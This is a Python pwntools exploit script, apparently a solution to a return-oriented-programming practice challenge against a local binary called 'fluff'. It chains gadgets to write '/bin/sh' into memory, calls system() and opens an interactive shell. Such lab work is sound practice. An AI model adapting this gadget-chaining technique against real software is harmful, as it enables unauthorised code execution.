from pwn import *



padding = "\x90" * 40
binsh = "/bin/sh\x00"

data = 0x601050
system = 0x4005e0
pop_rdi = 0x4008c3
pop_r12_xor_r10_r12 = 0x400853
mov_r10_r11 = 0x40084e
xor_r11_r11 = 0x400822
xor_r11_r12 = 0x40082f
xchg_r11_r10 = 0x400840
pop_r12 = 0x400832


exploit = padding

exploit += p64(pop_r12) 
exploit += p64(data)
exploit += p64(xor_r11_r11)
exploit += "JUNKJUNK"
exploit += p64(xor_r11_r12) 
exploit += "JUNKJUNK"

exploit += p64(xchg_r11_r10) 
exploit += "JUNKJUNK"
exploit += p64(xor_r11_r11)
exploit += "JUNKJUNK"
exploit += p64(pop_r12) 
exploit += binsh
exploit += p64(xor_r11_r12) 
exploit += "JUNKJUNK"

exploit += p64(mov_r10_r11)
exploit += "JUNKJUNK"
exploit += p64(0x0)
exploit += p64(pop_rdi)
exploit += p64(data)
exploit += p64(system)



r = process("/root/Desktop/fluff")
r.sendline(exploit)
r.interactive()
